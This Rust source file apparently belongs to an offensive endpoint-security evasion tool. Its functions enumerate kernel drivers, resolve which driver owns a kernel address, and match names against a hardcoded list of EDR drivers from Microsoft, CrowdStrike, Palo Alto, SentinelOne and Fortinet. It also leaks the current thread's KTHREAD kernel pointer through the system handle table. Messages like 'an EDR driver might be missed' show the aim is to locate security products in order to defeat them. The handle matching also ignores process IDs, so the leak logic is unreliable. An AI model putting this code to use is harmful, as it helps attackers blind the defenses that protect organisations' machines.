use std::ffi::{OsString};
use std::os::windows::ffi::OsStringExt;
use std::ffi::{c_void, CString};
use std::slice::from_raw_parts;

use winapi::shared::minwindef::{DWORD, LPVOID};
use winapi::shared::ntdef::HANDLE;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::psapi::{EnumDeviceDrivers, GetDeviceDriverBaseNameW};
use winapi::um::processthreadsapi::{OpenThread, GetCurrentThreadId};
use winapi::shared::ntdef::{NTSTATUS, ULONG};
use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_ALL_ACCESS};
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};

// NTSTATUS codes (simplified)
const STATUS_SUCCESS: NTSTATUS = 0;
const STATUS_INFO_LENGTH_MISMATCH: NTSTATUS = -1073741820; // 0xC0000004
const SYSTEM_HANDLE_INFORMATION_TYPE: ULONG = 0x10;
const OBJECT_THREAD_TYPE: u8 = 0x08; // This value is version-dependent; adjust per target OS

#[repr(C)]
#[derive(Debug)]
struct SystemHandle {
    process_id: u32,
    object_type_index: u8,
    flags: u8,
    handle_value: u16,
    object: *mut c_void,
    granted_access: u32,
}

#[repr(C)]
#[derive(Debug)]
struct SystemHandleInformation {
    number_of_handles: ULONG,
    handles: [SystemHandle; 1], // flexible array
}

type NtQuerySystemInformationFn = unsafe extern "system" fn(
    system_information_class: ULONG,
    system_information: *mut std::ffi::c_void,
    system_information_length: ULONG,
    return_length: *mut ULONG,
) -> NTSTATUS;


// Get the base address of a loaded driver (e.g., "ntoskrnl.exe" or "fltmgr.sys")
pub fn get_driver_base(drv_name: &str) -> Option<LPVOID> {
    unsafe {
        let mut drivers: Vec<LPVOID> = Vec::with_capacity(1024);
        let mut cb_needed: DWORD = 0;

        if EnumDeviceDrivers(
            drivers.as_mut_ptr(),
            (drivers.capacity() * std::mem::size_of::<LPVOID>()) as DWORD,
            &mut cb_needed,
        ) == 0
        {
            eprintln!("[!] EnumDeviceDrivers failed with error {}", GetLastError());
            return None;
        }

        let count = cb_needed as usize / std::mem::size_of::<LPVOID>();
        drivers.set_len(count);

        for &driver in &drivers {
            let mut name_buf: [u16; 260] = [0; 260];
            let len = GetDeviceDriverBaseNameW(
                driver as *mut _,
                name_buf.as_mut_ptr(),
                name_buf.len() as DWORD,
            );

            if len > 0 {
                let name = OsString::from_wide(&name_buf[..len as usize])
                    .to_string_lossy()
                    .into_owned();

                if name.eq_ignore_ascii_case(drv_name) {
                    return Some(driver);
                }
            }
        }
    }

    None
}


// Find the driver name given a kernel address.
// If the address belongs inside a driver/module, returns its name.
pub fn find_driver_name_from_addr(address: u64) -> Option<String> {
    unsafe {
        const MAX_DRIVERS: usize = 1024;
        let mut drivers: Vec<LPVOID> = vec![std::ptr::null_mut(); MAX_DRIVERS];
        let mut cb_needed: DWORD = 0;

        if EnumDeviceDrivers(
            drivers.as_mut_ptr(),
            (drivers.len() * std::mem::size_of::<LPVOID>()) as DWORD,
            &mut cb_needed,
        ) == 0
        {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        let count = cb_needed as usize / std::mem::size_of::<LPVOID>();
        drivers.truncate(count);

        let mut min_diff: u64 = u64::MAX;

        for &driver in &drivers {
            let base = driver as u64;
            if base <= address {
                let diff = address - base;
                if diff < min_diff {
                    min_diff = diff;
                }
            }
        }

        if min_diff == u64::MAX {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        // Recover base from the "best match"
        let base_addr = (address - min_diff) as LPVOID;

        let mut name_buf: [u16; 260] = [0; 260];
        let len = GetDeviceDriverBaseNameW(base_addr, name_buf.as_mut_ptr(), name_buf.len() as DWORD);

        if len == 0 {
            eprintln!(
                "[!] Could not resolve driver for 0x{:x}, an EDR driver might be missed",
                address
            );
            return None;
        }

        let os_str = OsString::from_wide(&name_buf[..len as usize]);
        Some(os_str.to_string_lossy().into_owned())
    }
}


// Check if the provided driver name matches a known EDR driver.
pub fn is_driver_name_matching_edr(driver: &str) -> bool {
    // Known EDR driver list (to be expanded as needed)
    const EDR_DRIVERS: &[&str] = &[
        // Windows Defender, MDE, etc.
        "WdFilter.sys",
        "WdBoot.sys",
        "MpKslDrv.sys",
        "mpFilter.sys",
        "SysmonDrv.sys",
        // CrowdStrike
        "csagent.sys",
        "CSDeviceControl.sys",
        "CSFirmwareAnalysis.sys",
        "cspcm4.sys",
        "Osfm-00000446.bin",
        // Palo Alto Networks: Cortex EDR, Traps, etc.
        "cyverak.sys",
        "cyvrlpc.sys",
        "cyvrmtgn.sys",
        "tdevflt.sys",
        "cyvrfsfd.sys",
        "tedrdrv.sys",
        "tedrpers",
        // SentinelOne
        "SentinelMonitor.sys",
        "SentinelDeviceControl.sys",
        "SentinelOne.sys",
        // FortiClient
        "fortiapd.sys",
        "FortiShield.sys",
    ];

    // Compare case-insensitive
    for &edr_driver in EDR_DRIVERS {
        if driver.eq_ignore_ascii_case(edr_driver) {
            return true;
        }
    }

    false
}

// Resolve NtQuerySystemInformation
fn resolve_ntqsi() -> Option<NtQuerySystemInformationFn> {
    unsafe {
        let module_name = CString::new("ntdll.dll").unwrap();
        let func_name = CString::new("NtQuerySystemInformation").unwrap();

        let h_module = GetModuleHandleA(module_name.as_ptr());
        if h_module.is_null() {
            eprintln!("[-] Failed to get module handle: {}", GetLastError());
            return None;
        }

        let proc = GetProcAddress(h_module, func_name.as_ptr());
        if proc.is_null() {
            eprintln!("[-] Failed to get proc address: {}", GetLastError());
            return None;
        }

        Some(std::mem::transmute::<_, NtQuerySystemInformationFn>(proc))
    }
}


// Generic helper: allocate a buffer, retry until the NT API says it's big enough.
unsafe fn query_system_information(
    ntqsi: NtQuerySystemInformationFn,
    info_class: ULONG,
) -> Option<Vec<u8>> {
    let mut buffer_size: ULONG = 4096;
    let mut buffer: Vec<u8> = vec![0; buffer_size as usize];

    loop {
        let mut return_length: ULONG = 0;
        let status = ntqsi(
            info_class,
            buffer.as_mut_ptr() as *mut _,
            buffer_size,
            &mut return_length,
        );

        if status == STATUS_SUCCESS {
            buffer.truncate(return_length as usize);
            return Some(buffer);
        } else if status == STATUS_INFO_LENGTH_MISMATCH {
            buffer_size *= 2; // grow the buffer
            buffer.resize(buffer_size as usize, 0);
            continue;
        } else {
            eprintln!("[-] NtQuerySystemInformation failed with NTSTATUS=0x{:X}", status);
            return None;
        }
    }
}


// Loop through handles and return a Vec of object pointers for the current thread
unsafe fn collect_thread_objects(h_thread: HANDLE, data: &[u8]) -> Vec<*mut core::ffi::c_void> {
    let header = data.as_ptr() as *const SystemHandleInformation;
    let number_of_handles = (*header).number_of_handles as usize;

    let first_handle_ptr = &(*header).handles as *const SystemHandle;
    let handles_slice = from_raw_parts(first_handle_ptr, number_of_handles);

    let mut kthread_vec: Vec<*mut core::ffi::c_void> = Vec::new();

    for h in handles_slice {
        if h.handle_value as HANDLE == h_thread {
            if h.object_type_index == OBJECT_THREAD_TYPE {
                kthread_vec.push(h.object);
            }
        }
    }

    kthread_vec
}


// Returns the last KTHREAD object pointer for the current thread
pub fn get_thread_info() -> Option<*mut core::ffi::c_void> {
    unsafe {
        // Get the current thread ID
        let tid = GetCurrentThreadId();

        // Open a handle to the current thread
        let h_thread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_ALL_ACCESS, false.into(), tid);
        if h_thread.is_null() {
            eprintln!("[-] Failed to open thread handle");
            return None;
        }

        // Resolve NtQuerySystemInformation
        let ntqsi = match resolve_ntqsi() {
            Some(f) => f,
            None => return None,
        };

        // Query SystemHandleInformation
        let data = match query_system_information(ntqsi, SYSTEM_HANDLE_INFORMATION_TYPE) {
            Some(d) => d,
            None => {
                eprintln!("[-] NtQuerySystemInformation query failed.");
                return None;
            }
        };

        // Collect KTHREAD object pointers for this thread
        let kthreads = collect_thread_objects(h_thread, &data);

        if kthreads.is_empty() {
            eprintln!("[-] No kernel thread objects found for this thread.");
            None
        } else {
            let last = *kthreads.last().unwrap();
            Some(last)
        }
    }
}

